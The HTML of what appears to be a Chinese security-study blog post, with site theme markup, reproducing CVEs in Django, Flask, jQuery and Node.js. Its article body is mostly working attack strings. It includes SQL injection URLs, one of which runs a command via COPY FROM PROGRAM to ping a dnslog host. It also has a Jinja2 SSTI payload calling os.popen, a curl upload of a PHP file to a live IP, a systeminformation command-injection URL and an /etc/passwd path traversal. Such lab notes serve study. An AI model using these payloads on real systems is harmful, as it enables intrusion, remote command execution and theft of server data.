@@ -1,0 +1,228 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Day63 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery | ai潼</title><meta name="author" content="pwy"><meta name="copyright" content="pwy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="#知识点：中间件及框架列表： IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等 1、开发框架-PHP-Laravel-Thinkphp 2、开发框架-Jav">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Day63 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery">
+<meta property="og:url" content="http://example.com/2023/03/13/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/index.html">
+<meta property="og:site_name" content="ai潼">
+<meta property="og:description" content="#知识点：中间件及框架列表： IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等 1、开发框架-PHP-Laravel-Thinkphp 2、开发框架-Jav">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic3.zhimg.com/80/v2-88e2d2400c7844ba02d11a18b13d65b6_1440w.webp">
+<meta property="article:published_time" content="2023-03-13T10:00:31.000Z">
+<meta property="article:modified_time" content="2023-03-14T12:28:52.527Z">
+<meta property="article:author" content="pwy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic3.zhimg.com/80/v2-88e2d2400c7844ba02d11a18b13d65b6_1440w.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/13/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Day63 服务攻防-框架安全&CVE复现&Django&Flask&Node.JS&JQuery',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-14 20:28:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ai潼" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tt.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic3.zhimg.com/80/v2-88e2d2400c7844ba02d11a18b13d65b6_1440w.webp')"><nav id="nav"><span id="blog-info"><a href="/" title="ai潼"><span class="site-name">ai潼</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Day63 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-13T10:00:31.000Z" title="发表于 2023-03-13 18:00:31">2023-03-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-14T12:28:52.527Z" title="更新于 2023-03-14 20:28:52">2023-03-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/">服务攻防</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Day63 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>中间件及框架列表：</p>
+<p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p>
+<p>1、开发框架-PHP-Laravel-Thinkphp</p>
+<p>2、开发框架-Javaweb-St2-Spring</p>
+<p>3、开发框架-Python-django-Flask</p>
+<p>4、开发框架-Javascript-Node.js-JQuery</p>
+<p>5、其他框架-Java-Apache Shiro&amp;Apache Sor</p>
+<p>常见语言开发框架：</p>
+<p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等</p>
+<p>JAVA：Spring MyBatis Hibernate Struts2 Springboot等</p>
+<p>Python：Django Flask Bottle Turbobars Tornado Web2py等</p>
+<p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p>
+<h3 id="章节内容："><a href="#章节内容：" class="headerlink" title="#章节内容："></a>#章节内容：</h3><p>常见中间件的安全测试：</p>
+<p>1、配置不当-解析&amp;弱口令</p>
+<p>2、安全机制-特定安全漏洞</p>
+<p>3、安全机制-弱口令爆破攻击</p>
+<p>4、安全应用-框架特定安全漏洞</p>
+<h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>-中间件安全测试流程：</p>
+<p>1、判断中间件信息-名称&amp;版本&amp;三方</p>
+<p>2、判断中间件问题-配置不当&amp;公开漏洞</p>
+<p>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
+<p>-应用服务安全测试流程：见图</p>
+<p>1、判断服务开放情况-端口扫描&amp;组合应用等</p>
+<p>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等</p>
+<p>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p>
+<p>-开发框架组件安全测试流程：</p>
+<p>1、判断常见语言开发框架类型</p>
+<p>2、判断开发框架存在的CVE问题</p>
+<p>3、判断开发框架CVE漏洞利用方式</p>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Python-开发框架安全-Django&amp;Flask</p>
+<p>➢ JavaScript-开发框架安全-Jquery&amp;Node</p>
+<h4 id="Python-开发框架安全-Django-amp-Flask"><a href="#Python-开发框架安全-Django-amp-Flask" class="headerlink" title="#Python-开发框架安全-Django&amp;Flask"></a>#Python-开发框架安全-Django&amp;Flask</h4><h5 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h5><p>Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开发。Django采用了MTV的框架模式，即模型M，视图V和模版T，使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能强大的第三方插件，使得Django具有较强的可扩展性。</p>
+<h6 id="1、cve-2019-14234-较鸡肋，需要后台权限"><a href="#1、cve-2019-14234-较鸡肋，需要后台权限" class="headerlink" title="1、cve_2019_14234(较鸡肋，需要后台权限)"></a>1、cve_2019_14234(较鸡肋，需要后台权限)</h6><p>复现链接：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1549898">CVE-2019-14234：Django JSONField SQL注入漏洞复现 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
+<p>账号：admin 密码a123123123进入 &#x2F;admin</p>
+<p>单引号已注入成功，SQL语句报错：</p>
+<p>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__a%27b&#x3D;123</p>
+<p>创建cmd_exec：</p>
+<p>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)–%20</p>
+<p>调用cmd_exec执行命令：</p>
+<p>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27–%20</p>
+<h6 id="2、CVE-2021-35042"><a href="#2、CVE-2021-35042" class="headerlink" title="2、CVE-2021-35042"></a>2、CVE-2021-35042</h6><p>复现链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43047908/article/details/119772225">(21条消息) CVE-2021-35042 Django SQL注入漏洞复现_她总是阴雨天的博客-CSDN博客</a></p>
+<p>目录：&#x2F;vuln&#x2F;?order&#x3D;vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23</p>
+<p>版本：&#x2F;vuln&#x2F;?order&#x3D;vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</p>
+<p>数据库名：&#x2F;vuln&#x2F;?order&#x3D;vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23</p>
+<h5 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h5><p>Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2 .</p>
+<p>?name&#x3D;%7B%25%20for%20c%20in%20%5B%5D.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()%20%25%7D%0A%7B%25%20if%20c.<strong>name</strong>%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.<strong>init</strong>.<strong>globals</strong>.values()%20%25%7D%0A%20%20%7B%25%20if%20b.<strong>class</strong>%20%3D%3D%20%7B%7D.<strong>class</strong>%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</p>
+<p>漏洞代码：</p>
+<p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314180135171.png" alt="image-20230314180135171"></p>
+<p>可控参数%s,这里时404_url,前面要输入个东西才可以回显（白盒漏洞，不知道参数）</p>
+<p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314180342585.png" alt="image-20230314180342585"></p>
+<p>换上payload，<em><strong>此处要url编码，因为是get请求，因为有空格，格式可能会出错</strong></em></p>
+<p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314180733986.png" alt="image-20230314180733986"></p>
+<p>执行whoami</p>
+<p><img src="/../images/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/image-20230314181029651.png" alt="image-20230314181029651"></p>
+<h4 id="JavaScript-开发框架安全-Jquery-amp-Node"><a href="#JavaScript-开发框架安全-Jquery-amp-Node" class="headerlink" title="#JavaScript-开发框架安全-Jquery&amp;Node"></a>#JavaScript-开发框架安全-Jquery&amp;Node</h4><p>jQuery </p>
+<h5 id="1、cve-2018-9207-cve-2018-9208-cve-2018-9209"><a href="#1、cve-2018-9207-cve-2018-9208-cve-2018-9209" class="headerlink" title="1、cve_2018_9207  cve_2018_9208 cve_2018_9209"></a>1、cve_2018_9207  cve_2018_9208 cve_2018_9209</h5><p>复现链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42675091/article/details/126675939">(21条消息) jquery 文件上传 （CVE-2018-9207）漏洞复现-CSDN博客</a></p>
+<p>描述: jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（框架）于2006年1月由John Resig发布。</p>
+<p>jQuery Upload File &lt;&#x3D; 4.0.2 中的任意文件上传</p>
+<p>curl -F “myfile&#x3D;@php.php” “<a target="_blank" rel="noopener" href="http://123.58.236.76:56579/jquery-upload-file/php/upload.php">http://123.58.236.76:56579/jquery-upload-file/php/upload.php</a>“</p>
+<h5 id="1、cve-2021-21315"><a href="#1、cve-2021-21315" class="headerlink" title="1、cve_2021_21315"></a>1、cve_2021_21315</h5><p>Node.js </p>
+<p>Node.js是一个基于Chrome V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。</p>
+<p>Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。</p>
+<p>复现链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/284350.html">CVE-2021-21315 NodeJs命令注入漏洞复现 - FreeBuf网络安全行业门户</a></p>
+<p>Systeminformation &lt;  5.3.1</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git</a></p>
+<p>node index.js</p>
+<p>&#x2F;api&#x2F;getServices?name[]&#x3D;$(echo -e ‘xiaodi’ &gt; test.txt)</p>
+<p>2、cve_2017_14849</p>
+<p>GET：</p>
+<p>&#x2F;static&#x2F;..&#x2F;..&#x2F;..&#x2F;a&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">pwy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/13/Day63-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Django-Flask-Node-JS-JQuery/">http://example.com/2023/03/13/Day63-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">ai潼</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://pic3.zhimg.com/80/v2-88e2d2400c7844ba02d11a18b13d65b6_1440w.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/13/Day64-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Apache-Shiro-Apache-Solr/" title="Day64 服务攻防框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr"><img class="cover" src="https://pic2.zhimg.com/80/v2-8e18c9bfb008b1f987f34424213d907d_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Day64 服务攻防框架安全&amp;CVE复现&amp;Apache Shiro&amp;Apache Solr</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/13/Day62-%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2-%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-CVE%E5%A4%8D%E7%8E%B0-Spring-Struts-Laravel-ThinkPHP/" title="Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP"><img class="cover" src="https://pic3.zhimg.com/80/v2-2036ce2301f3d14ae389e3f79282a682_1440w.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Day62 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravel&amp;ThinkPHP</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tt.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pwy</div><div class="author-info__description">自律&上进</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">76</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">#知识点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%A0%E8%8A%82%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">#章节内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">#前置知识：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">演示案例：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-Django-amp-Flask"><span class="toc-number">4.1.</span> <span class="toc-text">#Python-开发框架安全-Django&amp;Flask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Django"><span class="toc-number">4.1.1.</span> <span class="toc-text">Django</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1%E3%80%81cve-2019-14234-%E8%BE%83%E9%B8%A1%E8%82%8B%EF%BC%8C%E9%9C%80%E8%A6%81%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">1、cve_2019_14234(较鸡肋，需要后台权限)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2%E3%80%81CVE-2021-35042"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">2、CVE-2021-35042</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Flask-Jinja2-SSTI"><span class="toc-number">4.1.2.</span> <span class="toc-text">Flask Jinja2 SSTI</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript-%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8-Jquery-amp-Node"><span class="toc-number">4.2.</span> <span class="toc-text">#JavaScript-开发框架安全-Jquery&amp;Node</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81cve-2018-9207-cve-2018-9208-cve-2018-9209"><span class="toc-number">4.2.1.</span> <span class="toc-text">1、cve_2018_9207  cve_2018_9208 cve_2018_9209</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#1%E3%80%81cve-2021-21315"><span class="toc-number">4.2.2.</span> <span class="toc-text">1、cve_2021_21315</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/05/12/hello-world/" title="Hello World">Hello World</a><time datetime="2023-05-12T15:24:14.066Z" title="发表于 2023-05-12 23:24:14">2023-05-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/04/27/Day113-%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97-%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD-API%E5%B0%81%E8%A3%85-UUID%E6%A0%87%E8%AF%86-MAC%E5%9C%B0%E5%9D%80-IPV4%E5%9C%B0%E5%9D%80-%E5%90%84%E8%AF%AD%E8%A8%80/" title="Day113 免杀对抗-内存加载&amp;API封装&amp;UUID标识&amp;MAC地址&amp;IPV4地址&amp;各语言">Day113 